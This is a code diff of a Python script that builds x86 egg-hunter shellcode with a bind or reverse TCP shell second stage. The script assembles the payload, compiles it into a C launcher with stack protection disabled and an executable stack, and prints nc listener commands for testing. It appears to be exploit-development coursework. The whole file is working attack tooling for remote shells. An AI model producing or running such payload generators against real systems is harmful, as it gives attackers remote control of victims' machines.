@@ -58,13 +58,13 @@ def gen_shellcode(filename):
 def print_egghunter(shellcode, technique):
 	
 	print("\n[*] Generating shellcode for x86 egg hunter using {} technique".format(technique))
-	print("[*] Shellcode length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
+	print("[*] Egg hunter length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
 	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
 	print('"' + shellcode + '"')
 
-def print_shellcode(shellcode, address, port):
+def print_shellcode(shellcode, payload, address, port):
 	
-	print("\n[*] Generating shellcode for x86 TCP reverse shell on {0}:{1}".format(address, port))
+	print("\n[*] Generating shellcode for x86 TCP {0} shell on {1}:{2}".format(payload, address, port))
 	print("[*] Shellcode length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
 	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
 	print('"' + shellcode + '"')
@@ -77,8 +77,10 @@ def main():
 	parser.add_argument('-x', '--payload', type=str, help='Type of payload to execute', choices=payload_choices)
 	parser.add_argument('-l', '--lhost', required=(payload_choices[1] in sys.argv), type=str, help='Remote IPv4 address for TCP reverse shell to connect to.', default="127.0.0.1")
 	parser.add_argument('-p', '--lport', type=int, help='Remote port for TCP reverse shell to connect to.', choices=range(0,65535), metavar="{0..65535}", default=4444)
+	parser.add_argument('-s', '--shellcode', help='Output shellcode only')
 	
 	args = parser.parse_args()
+	
 	if len(sys.argv) == 1:
 		parser.print_help()
 		sys.exit()
@@ -87,7 +89,7 @@ def main():
 		try:
 			socket.inet_aton(args.lhost)
 		except:
-			print("[-] Invalid IP addres entered. Exiting...")
+			print("[-] Invalid IP address entered. Exiting...")
 			sys.exit()
 
 	# Modify the host address and port in tcp_reverse_shell_x86.nasm
@@ -117,17 +119,13 @@ def main():
 	# Dump the second stage shellcode using objdump
 	shellcode = egg + gen_shellcode(shell_filename)
 
-	print("\n[*] Printing shellcode")
-	print(shellcode)
+	if args.shellcode:
+		# Print egg hunter shellcode
+		print_egghunter(egghunter, args.technique)
 
-	print("\n[*] Printing egghunter")
-	print(egghunter)
-
-	# Print egg hunter shellcode
-	# print_egghunter(egghunter, args.technique)
-
-	# Print second stage shellcode
-	# print_shellcode(shellcode, args.lhost, args.lport)
+		# Print second stage shellcode
+		print_shellcode(shellcode, args.payload, args.lhost, args.lport)
+		sys.exit()
 
 	# Place the generated egg hunter and second stage shellcode into C skselton file
 	set_shellcode(egghunter, shellcode)
@@ -135,12 +133,14 @@ def main():
 	# Compile C skeleton file
 	os.system('gcc -fno-stack-protector -z execstack tmp.c -o egg_hunter_{}_x86'.format(args.payload))
 
-	print("\n[*] Compiled egg hunter!")
+	print("\n[*] Compiled shellcode for x86 egg hunter".format(args.technique, args.payload))
+	print("[*] Technique: {}(2)".format(args.technique))
+	print("[*] Payload: {} shell".format(args.payload))
 	if args.payload == "bind":
-		print("[*] It's a bind shell")
-	elif args.payload == "reverse":
-		print("[*] It's a reverse shell")
-
+		print("[*] Test by executing: ./egg_hunter_bind_x86 and connecting with nc {0} {1}".format(args.lhost, args.lport))
+	if args.payload == "reverse":
+		print("[*] Test by starting a listener with nc -nlvp {} and executing ./egg_hunter_reverse_x86".format(args.lport))
+	
 	# Cleanup
 	os.system('rm tmp.nasm')
 	os.system('rm tmp.c')
